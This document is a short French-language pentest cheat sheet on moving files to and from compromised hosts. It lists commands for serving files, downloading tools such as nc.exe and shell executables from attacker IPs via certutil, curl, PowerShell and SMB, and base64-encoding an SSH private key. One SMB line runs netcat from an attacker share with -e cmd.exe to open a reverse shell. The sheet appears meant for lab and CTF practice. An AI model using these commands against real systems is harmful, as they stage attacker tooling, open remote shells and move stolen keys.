# Serveur

## Apache

```bash
sudo systemctl start apache2
```

Remarque :
- Copier les fichiers dans /var/www/html/

## Python

```bash
sudo python -m http.server 8000
sudo python -m pyftpdlib -p 21
```

## SMB 

```bash
impacket-smbserver share . -smb2support -username user -password s3cureP@ssword
```

# Télécharger

## Bash

```bash
exec 3<>/dev/tcp/10.10.10.32/80
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

## Certutil

```powershell
certutil -f -urlcache http://192.168.1.200:6666/nc.exe nc.exe
```

## cURL

```bash
curl ATTACKING_IP/socat -o /tmp/socat-USERNAME && chmod +x /tmp/socat-USERNAME
```

## FTP

```bash
wget -r ftp://anonymous@192.168.237.127:30021
```

## Netcat

```bash
nc <MACHINE_IP> <PORT> < fichier.txt
nc -lnvp <PORT> > fichier.txt
```

## PHP

```bash
php -S 0.0.0.0:8000
```

## PowerShell

```powershell
iwr -uri http://192.168.119.2/nonstaged.exe -Outfile nonstaged.exe

powershell "(New-Object 
Net.WebClient).Downloadfile('http://192.168.1.5:8080/shell-name.exe', 'shell-name.exe')"

powershell wget -Uri http://192.168.118.4/nc.exe -OutFile C:\Windows\Temp\nc.exe

Invoke-WebRequest -Uri "http://www.coucou.com" -OutFile "C:\path\file"

$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

## SCP

```bash
scp cve-xxxx.c test@192.168.123.216:
scp Administrator@10.10.0.124:blood.zip /root/Downloads
```

## SMB

```powershell
net use \\ATTACKER_IP\share /USER:user s3cureP@ssword
copy \\ATTACKER_IP\share\Wrapper.exe %TEMP%\wrapper-USERNAME.exe

cmd.exe /c //192.168.45.175/share/nc.exe -e cmd.exe 192.168.45.175 1234
```

## WGET

```bash
wget http://IP_ADDRESS:8000/filename -outfile "file"
```

# Encodage

```bash
cat id_rsa |base64 -w 0;echo
```

```powershell
PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ{...} qUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo="))
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```